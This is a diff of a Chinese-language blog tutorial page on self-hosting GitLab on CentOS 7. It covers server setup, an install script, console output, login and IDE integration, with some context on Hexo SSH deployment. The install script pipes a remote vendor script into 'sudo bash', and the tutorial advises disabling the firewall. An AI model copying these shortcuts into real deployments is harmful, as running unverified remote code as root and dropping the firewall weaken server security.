+<p><img src="/2022/02/22/Git/image-20220225202503138.png" alt="image-20220225202503138"></p>
+<p>授权登录后,就可以导入<img src="/2022/02/22/Git/image-20220225204023061.png" alt="image-20220225204023061"></p>
+<p>当在GitHub上项目更新后，在gitee上<img src="/2022/02/22/Git/image-20220225204321140.png" alt="image-20220225204321140"></p>
+<p>点击仓库名后面刷新就能更新到gitee上的</p>
+<h1 id="第十章-自建代码托管平台-GitLab"><a href="#第十章-自建代码托管平台-GitLab" class="headerlink" title="第十章 自建代码托管平台-GitLab"></a>第十章 自建代码托管平台-GitLab</h1><h2 id="10-1-GitLab简介"><a href="#10-1-GitLab简介" class="headerlink" title="10.1 GitLab简介"></a>10.1 GitLab简介</h2><p>GitLab是由GitLabInc.开发，使用 MIT许可证的基于网络的Git仓库管理工具，且具有wiki和 issue跟踪功能。使用 Git作为代码管理工具，并在此基础上搭建起来的web服务。<br>GitLab由乌克兰程序员 DmitriyZaporozhets和ValerySizov开发，它使用Ruby 语言写成。后来，一些部分用Go语言重写。截止2018年5月，该公司约有290名团队成员，以及2000多名开源贡献者。GitLab被 IBM，Sony，JulichResearchCenter，NASA.Alibaba,Invincea，O’ReillyMedia，Leibniz-Rechenzentrum(LRZ)，CERN，SpaceX等组织使用。</p>
+<h2 id="10-2-GitLab官网地址"><a href="#10-2-GitLab官网地址" class="headerlink" title="10.2 GitLab官网地址"></a>10.2 GitLab官网地址</h2><p>官网：<a target="_blank" rel="noopener" href="https://about.gitlab.com/">https://about.gitlab.com/</a></p>
+<p>安装说明：<a target="_blank" rel="noopener" href="https://about.gitlab.com/installation">https://about.gitlab.com/installation</a></p>
+<p><img src="/2022/02/22/Git/image-20220225211719767.png" alt="image-20220225211719767"></p>
+<h2 id="10-3-GitLab安装"><a href="#10-3-GitLab安装" class="headerlink" title="10.3 GitLab安装"></a>10.3 GitLab安装</h2><h3 id="10-3-1-服务器准备"><a href="#10-3-1-服务器准备" class="headerlink" title="10.3.1 服务器准备"></a>10.3.1 服务器准备</h3><p>准备一个系统为CentOS7 及以上版本的服务器，要求内存4G，磁盘50G。关闭防火墙,并且配置好主机名和IP，保证服务器可以上网。<br>此教程使用虚拟机:主机名: gitlab-server  IP地址:192.168.6.200</p>
+<p>修改ip: vim /etc/sysconfig/network-scripts/ifcfg-ens33<img src="/2022/02/22/Git/image-20220225213559717.png" alt="image-20220225213559717"></p>
+<p>修改主机名：vim /etc/hostname    之后重启一下</p>
+<p>配置Windows host文件以及Xshell链接地址</p>
+<p>C:\Windows\System32\drivers\etc\hosts</p>
+<p><img src="/2022/02/22/Git/image-20220225214054194.png" alt="image-20220225214054194"></p>
+<p>Xshell链接地址:<img src="/2022/02/22/Git/image-20220225214159925.png" alt="image-20220225214159925"></p>
+<h3 id="10-3-2-安装包准备"><a href="#10-3-2-安装包准备" class="headerlink" title="10.3.2 安装包准备"></a>10.3.2 安装包准备</h3><p>Yum在线安装gitlab- ce时，需要下载几百M的安装文件，非常耗时，所以最好提前把所需RPM包下载到本地，然后使用离线rpm的方式安装。</p>
+<p>下载地址：<img src="/2022/02/22/Git/image-20220225212739372.png" alt="image-20220225212739372"></p>
+<p>直接将此包上传到服务器/opt/module 目录下即可</p>
+<h3 id="10-3-3-编写安装脚本"><a href="#10-3-3-编写安装脚本" class="headerlink" title="10.3.3 编写安装脚本"></a>10.3.3 编写安装脚本</h3><p>安装gitlab步骤繁琐，参考官网编写gitlab的安装脚本</p>
+<p><img src="/2022/02/22/Git/image-20220225214816079.png" alt="image-20220225214816079"></p>
+<p><img src="/2022/02/22/Git/image-20220225214515953.png" alt="image-20220225214515953"></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vim</span> gitlab-install.<span class="keyword">sh</span></span><br><span class="line"></span><br><span class="line">sudo rpm -ivh /<span class="keyword">opt</span>/module/gitlab-<span class="keyword">ce</span>-<span class="number">13.10</span>.<span class="number">2</span>-<span class="keyword">ce</span>.<span class="number">0</span>.el7.x86_64.rpm</span><br><span class="line"></span><br><span class="line">sudo yum install -<span class="keyword">y</span> curl policycoreutils-<span class="keyword">python</span> openssh-server cronie</span><br><span class="line"></span><br><span class="line">sudo lokkit -s http -s ssh</span><br><span class="line"></span><br><span class="line">sudo yum install -<span class="keyword">y</span> postfix</span><br><span class="line"></span><br><span class="line">sudo service postfix start</span><br><span class="line"></span><br><span class="line">sudo chkconfig postfix <span class="keyword">on</span></span><br><span class="line"></span><br><span class="line">curl http<span class="variable">s:</span>//packages.gitlab.<span class="keyword">com</span>/install/repositories/gitlab/gitlabce/script.rpm.<span class="keyword">sh</span> | sudo bash</span><br><span class="line"></span><br><span class="line">sudo EXTERNAL_URL=<span class="string">&quot;http://gitlab.example.com&quot;</span> yum -<span class="keyword">y</span> install gitlabce</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>给脚本增加执行权限:</p>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x gitlab-<span class="keyword">install</span>.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/22/Git/image-20220225215243762.png" alt="image-20220225215243762"></p>
+<p>然后执行该脚本，开始安装 gitlab-ce。注意一定要保证服务器可以上网。</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@gitlab-server <span class="keyword">module</span>]# ./gitlab-install.sh</span><br><span class="line">警告： /opt/<span class="keyword">module</span>/gitlab-ce<span class="number">-13.10</span><span class="number">.2</span>-ce<span class="number">.0</span>.el7.x86_64.rpm: 头 V4</span><br><span class="line">RSA/SHA1 Signature, 密钥 ID f27eab47: NOKEY</span><br><span class="line">准备中... #################################</span><br><span class="line">[<span class="number">100</span>%]</span><br><span class="line">正在升级/安装...</span><br><span class="line"><span class="number">1</span>:gitlab-ce<span class="number">-13.10</span><span class="number">.2</span>-ce<span class="number">.0</span>.el7</span><br><span class="line">################################# [<span class="number">100</span>%]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="10-3-4-初始化GitLab服务"><a href="#10-3-4-初始化GitLab服务" class="headerlink" title="10.3.4 初始化GitLab服务"></a>10.3.4 初始化GitLab服务</h3><p>执行以下命令初始化 GitLab 服务，过程大概需要几分钟，耐心等待…</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="variable">@gitlab</span><span class="operator">-</span>server <span class="keyword">module</span>]# gitlab<span class="operator">-</span>ctl reconfigure</span><br><span class="line">。 。 。 。 。 。</span><br><span class="line"><span class="keyword">Running</span> handlers:</span><br><span class="line"><span class="keyword">Running</span> handlers complete</span><br><span class="line">Chef Client finished, <span class="number">425</span><span class="operator">/</span><span class="number">608</span> resources updated <span class="keyword">in</span> <span class="number">03</span> minutes <span class="number">08</span></span><br><span class="line">seconds</span><br><span class="line">gitlab Reconfigured<span class="operator">!</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="10-3-5-启动GitLab服务"><a href="#10-3-5-启动GitLab服务" class="headerlink" title="10.3.5 启动GitLab服务"></a>10.3.5 启动GitLab服务</h3><p>执行以下命令启动 GitLab 服务，如需停止，执行 gitlab-ctl stop</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">root@gitlab-server</span> <span class="string">module</span>]<span class="comment"># gitlab-ctl start</span></span><br><span class="line"><span class="attr">ok: run: alertmanager:</span> <span class="string">(pid</span> <span class="number">6812</span><span class="string">)</span> <span class="string">134s</span></span><br><span class="line"><span class="attr">ok: run: gitaly:</span> <span class="string">(pid</span> <span class="number">6740</span><span class="string">)</span> <span class="string">135s</span></span><br><span class="line"><span class="attr">ok: run: gitlab-monitor:</span> <span class="string">(pid</span> <span class="number">6765</span><span class="string">)</span> <span class="string">135s</span></span><br><span class="line"><span class="attr">ok: run: gitlab-workhorse:</span> <span class="string">(pid</span> <span class="number">6722</span><span class="string">)</span> <span class="string">136s</span></span><br><span class="line"><span class="attr">ok: run: logrotate:</span> <span class="string">(pid</span> <span class="number">5994</span><span class="string">)</span> <span class="string">197s</span></span><br><span class="line"><span class="attr">ok: run: nginx:</span> <span class="string">(pid</span> <span class="number">5930</span><span class="string">)</span> <span class="string">203s</span></span><br><span class="line"><span class="attr">ok: run: node-exporter:</span> <span class="string">(pid</span> <span class="number">6234</span><span class="string">)</span> <span class="string">185s</span></span><br><span class="line"><span class="attr">ok: run: postgres-exporter:</span> <span class="string">(pid</span> <span class="number">6834</span><span class="string">)</span> <span class="string">133s</span></span><br><span class="line"><span class="attr">ok: run: postgresql:</span> <span class="string">(pid</span> <span class="number">5456</span><span class="string">)</span> <span class="string">257s</span></span><br><span class="line"><span class="attr">ok: run: prometheus:</span> <span class="string">(pid</span> <span class="number">6777</span><span class="string">)</span> <span class="string">134s</span></span><br><span class="line"><span class="attr">ok: run: redis:</span> <span class="string">(pid</span> <span class="number">5327</span><span class="string">)</span> <span class="string">263s</span></span><br><span class="line"><span class="attr">ok: run: redis-exporter:</span> <span class="string">(pid</span> <span class="number">6391</span><span class="string">)</span> <span class="string">173s</span></span><br><span class="line"><span class="attr">ok: run: sidekiq:</span> <span class="string">(pid</span> <span class="number">5797</span><span class="string">)</span> <span class="string">215s</span></span><br><span class="line"><span class="attr">ok: run: unicorn:</span> <span class="string">(pid</span> <span class="number">5728</span><span class="string">)</span> <span class="string">221s</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="10-3-6-使用浏览器访问GitLab"><a href="#10-3-6-使用浏览器访问GitLab" class="headerlink" title="10.3.6 使用浏览器访问GitLab"></a>10.3.6 使用浏览器访问GitLab</h3><p>使用主机名或者 IP 地址即可访问 GitLab 服务。可配一下 windows 的 hosts 文件（C:\Windows\System32\drivers\etc）。默认端口80</p>
+<p><img src="/2022/02/22/Git/image-20220225220436601.png" alt="image-20220225220436601"></p>
+<p>首次登陆之前，需要修改下 GitLab 提供的 root 账户的密码，要求 8 位以上，包含大小写子母和特殊符号。然后使用修改后的密码登录GitLab。</p>
+<p><img src="/2022/02/22/Git/image-20220225220514500.png" alt="image-20220225220514500"></p>
+<p>GitLab 登录成功   </p>
+<p><img src="/2022/02/22/Git/image-20220225220533027.png" alt="image-20220225220533027"></p>
+<h3 id="10-3-7-GitLab创建远程库"><a href="#10-3-7-GitLab创建远程库" class="headerlink" title="10.3.7 GitLab创建远程库"></a>10.3.7 GitLab创建远程库</h3><p>点New projects</p>
+<p><img src="/2022/02/22/Git/image-20220225220549064.png" alt="image-20220225220549064"></p>
+<p><img src="/2022/02/22/Git/image-20220225220603110.png" alt="image-20220225220603110"></p>
+<p><img src="/2022/02/22/Git/image-20220225220620407.png" alt="image-20220225220620407"></p>
+<h3 id="10-3-8-IDEA集成GitLab"><a href="#10-3-8-IDEA集成GitLab" class="headerlink" title="10.3.8 IDEA集成GitLab"></a>10.3.8 IDEA集成GitLab</h3><p>安装Gitlab插件</p>
+<p><img src="/2022/02/22/Git/image-20220225220641597.png" alt="image-20220225220641597"></p>
+<p><img src="/2022/02/22/Git/image-20220225221714767.png" alt="image-20220225221714767"></p>
+<p><img src="/2022/02/22/Git/image-20220225221916305.png" alt="image-20220225221916305"></p>
+<p><img src="/2022/02/22/Git/image-20220225221936939.png" alt="image-20220225221936939"></p>
+<p>push-&gt;定义远程-&gt;粘贴gitlab链接</p>
+<p><img src="/2022/02/22/Git/image-20220225222057052.png" alt="image-20220225222057052"></p>
+<p>Git操作等与Github、Gitee的IDEA插件大同小异</p>
+
       
     </div>
 
@@ -2074,7 +3022,7 @@
 <p>npm install hexo-deployer-git –save</p>
 <p> 3.输入cd ~/.ssh,如果出现入下图情况，说明不存在.ssh</p>
 <p><img src="/2022/01/20/BLOG-%E6%90%AD%E5%BB%BA/image-20220120134422521.png" alt="image-20220120134422521"></p>
-<p> 解决方法：输入 $ ssh-keygen -t rsa -C “<a href="mailto:&#x78;&#120;&#120;&#x78;&#x78;&#x78;&#120;&#x40;&#113;&#x71;&#x2e;&#x63;&#x6f;&#x6d;">&#x78;&#120;&#120;&#x78;&#x78;&#x78;&#120;&#x40;&#113;&#x71;&#x2e;&#x63;&#x6f;&#x6d;</a>“(自己邮箱) 再次如下图进行操作，出现相同文件说明成功</p>
+<p> 解决方法：输入 $ ssh-keygen -t rsa -C “<a href="mailto:&#x78;&#x78;&#120;&#120;&#120;&#120;&#x78;&#64;&#x71;&#113;&#x2e;&#99;&#x6f;&#109;">&#x78;&#x78;&#120;&#120;&#120;&#120;&#x78;&#64;&#x71;&#113;&#x2e;&#99;&#x6f;&#109;</a>“(自己邮箱) 再次如下图进行操作，出现相同文件说明成功</p>
 <img src="/2022/01/20/BLOG-%E6%90%AD%E5%BB%BA/image-20220120134448931.png" alt="image-20220120134448931" style="zoom:80%;">
 
 <p>4.输入eval “$(ssh-agent -s)”，添加密钥到ssh-agent</p>
@@ -2084,7 +3032,7 @@
 
 <p><img src="/2022/01/20/BLOG-%E6%90%AD%E5%BB%BA/image-20220120134641323.png" alt="image-20220120134641323"></p>
 <p>填写key<img src="/2022/01/20/BLOG-%E6%90%AD%E5%BB%BA/image-20220120134719640.png" alt="image-20220120134719640"></p>
-<p>6.输入ssh -T <a href="mailto:&#103;&#105;&#116;&#x40;&#x67;&#x69;&#116;&#x68;&#x75;&#x62;&#46;&#99;&#x6f;&#109;">&#103;&#105;&#116;&#x40;&#x67;&#x69;&#116;&#x68;&#x75;&#x62;&#46;&#99;&#x6f;&#109;</a>，测试添加ssh是否成功。如果看到Hi后面是你的用户名，就说明成功了（有一个会让你输入 yes）</p>
+<p>6.输入ssh -T <a href="mailto:&#103;&#105;&#116;&#x40;&#x67;&#105;&#x74;&#104;&#117;&#98;&#46;&#x63;&#x6f;&#109;">&#103;&#105;&#116;&#x40;&#x67;&#105;&#x74;&#104;&#117;&#98;&#46;&#x63;&#x6f;&#109;</a>，测试添加ssh是否成功。如果看到Hi后面是你的用户名，就说明成功了（有一个会让你输入 yes）</p>
 <p>7.设置你的账号信息<img src="/2022/01/20/BLOG-%E6%90%AD%E5%BB%BA/image-20220120134805292.png" alt="image-20220120134805292"></p>
 <p>name和email后写自己的即可</p>
 <p>8.部署到github  hexo d     使用用户名.github.io 即可访问自己博客 </p>
@@ -2187,7 +3135,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-02-21 22:47:43" itemprop="dateModified" datetime="2022-02-21T22:47:43+08:00">2022-02-21</time>
+      <time title="Modified: 2022-02-27 23:11:15" itemprop="dateModified" datetime="2022-02-27T23:11:15+08:00">2022-02-27</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -2785,13 +3733,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="Symbols count total">64k</span>
+    <span title="Symbols count total">90k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">58 mins.</span>
+    <span title="Reading time total">1:21</span>
   </span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
